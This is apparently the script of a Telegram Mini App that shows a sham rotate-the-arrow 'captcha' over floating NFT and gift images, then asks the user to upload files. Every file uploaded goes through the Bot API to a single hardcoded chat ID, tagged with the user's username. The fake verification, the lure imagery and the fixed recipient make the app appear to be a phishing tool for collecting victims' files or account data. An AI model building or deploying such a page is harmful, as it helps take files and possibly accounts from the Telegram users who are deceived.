const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

// Настройки
const BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"; // Замените на токен из @BotFather
const TARGET_ID = "7632180689";   // ID получателя

const captchaScreen = document.getElementById('captchaScreen');
const mainScreen = document.getElementById('mainScreen');
const floatingBg = document.getElementById('floatingBg');
const rotateCircle = document.getElementById('rotateCircle');
const degreeIndicator = document.getElementById('degreeIndicator');
const verifyBtn = document.getElementById('verifyBtn');
const welcomeText = document.getElementById('welcomeText');
const userInfo = document.getElementById('userInfo');
const sendFileBtn = document.getElementById('sendFileBtn');
const fileInput = document.getElementById('fileInput');
const status = document.getElementById('status');

const photoUrls = [
    'https://yt3.googleusercontent.com/v5uMoct16G7gneNFzOx71EZHam15nxmcxpcovXNMRMM0UtxsGq0IWn5ZcLmQ0pGgOIuGHBSTmFY=s900-c-k-c0x00ffffff-no-rj',
    'https://i.getgems.io/TBlXd0AGxwweh_orE0Cj8J_wMTVDeGDzkp0KaC6lcVk/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2ltYWdlcy9FUUNXaDFsUGx0eVR3Q1d4Q1htNHVtTDV0UFpvWFI4a1RJY1QtcGQwSnFvYWRMSG8vODMwMWE1NTIwYWJlMDkyZA',
    'https://i.getgems.io/FIFF8-gSDSLwn7eJ2h6_Z93zNCrLk_8Mm0DpXS6VJTU/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2ltYWdlcy9FUUQ5aWtacTZ4UGdLanptZEJHMEcwUzgwUnZVSmpid2dIclBaWERLY193c0U4NHcvOTU4NzA1Mjc1OTBiNzJiOQ',
    'https://cache.tonapi.io/imgproxy/emGFD8G3jt41AkBJLS2ygiHlTP20aCPP_tN0O7j_9aA/rs:fill:1500:1500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvY3J5c3RhbGJhbGwtNDk0LndlYnA.webp',
    'https://i.getgems.io/JPLdyQ18jDump5MEqq7XSz-ACNhOIcB3j__Fu4YoBls/rs:fill:500:500:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2ltYWdlcy9FUURJUmVsZU9rVHhDRDRnX1hFbTh4jBMWU5nNi16TXNUR0FBd0CBLXZFYmtHQnUvOWM4MDk4NjQwNmU4MjFlMg',
    'https://static6.tgstat.ru/channels/_0/7c/7c8536637e62010b627a43f09fe8a469.jpg'
];

let rotationAngle = 0;
let username = 'Гость';

function init() {
    if (tg.initDataUnsafe?.user) {
        username = tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name || 'Гость';
    }
    createBackground();
    setupRotation();
    setupEventListeners();
}

function createBackground() {
    photoUrls.forEach((url, index) => {
        const img = document.createElement('div');
        img.className = 'floating-photo';
        const size = 120 + Math.random() * 80;
        img.style.width = `${size}px`;
        img.style.height = `${size}px`;
        img.style.top = `${Math.random() * 80}%`;
        img.style.left = `${Math.random() * 80}%`;
        img.style.backgroundImage = `url('${url}')`;
        img.style.animationDuration = `${50 + (index * 5)}s`;
        floatingBg.appendChild(img);
    });
}

function setupRotation() {
    let isDragging = false;
    let startAngle = 0;
    let startRotation = 0;

    const startDrag = (e) => {
        isDragging = true;
        const touch = e.touches ? e.touches[0] : e;
        const rect = rotateCircle.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        startAngle = Math.atan2(touch.clientY - centerY, touch.clientX - centerX);
        startRotation = rotationAngle;
    };

    const drag = (e) => {
        if (!isDragging) return;
        const touch = e.touches ? e.touches[0] : e;
        const rect = rotateCircle.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        const angle = Math.atan2(touch.clientY - centerY, touch.clientX - centerX);
        rotationAngle = startRotation + (angle - startAngle) * (180 / Math.PI);
        updateRotation();
    };

    rotateCircle.addEventListener('mousedown', startDrag);
    rotateCircle.addEventListener('touchstart', startDrag);
    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', (e) => isDragging && e.preventDefault(), {passive: false});
    document.addEventListener('touchmove', drag);
    document.addEventListener('mouseup', () => isDragging = false);
    document.addEventListener('touchend', () => isDragging = false);
}

function updateRotation() {
    rotationAngle = ((rotationAngle + 180) % 360) - 180;
    rotateCircle.style.transform = `rotate(${rotationAngle}deg)`;
    degreeIndicator.textContent = `${Math.round(rotationAngle)}°`;
    if (Math.abs(rotationAngle - 90) < 10) {
        rotateCircle.style.boxShadow = '0 0 40px rgba(0, 255, 0, 0.7)';
    } else {
        rotateCircle.style.boxShadow = '0 0 30px rgba(0, 255, 0, 0.5)';
    }
}

function setupEventListeners() {
    verifyBtn.addEventListener('click', () => {
        if (Math.abs(rotationAngle - 90) < 10) {
            captchaScreen.style.display = 'none';
            mainScreen.style.display = 'flex';
            welcomeText.textContent = `Добро пожаловать, ${username}!`;
        } else {
            showStatus('Поверните стрелку на 90° вправо!', 'error');
        }
    });
    sendFileBtn.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', handleFileUpload);
}

async function handleFileUpload(event) {
    const files = Array.from(event.target.files);
    if (!files.length) return;
    
    showStatus(`📤 Отправка ${files.length} файла(ов)...`, 'info');
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_ID);
        formData.append('document', file);
        formData.append('caption', `Файл от @${username}`);

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Ошибка:', error);
        }
    }
    
    showStatus(`✅ Файлы успешно отправлены!`, 'success');
    event.target.value = '';
}

function showStatus(message, type) {
    status.textContent = message;
    status.className = `status ${type}`;
    status.style.display = 'block';
    if (type !== 'info') setTimeout(() => status.style.display = 'none', 3000);
}

document.addEventListener('DOMContentLoaded', init);
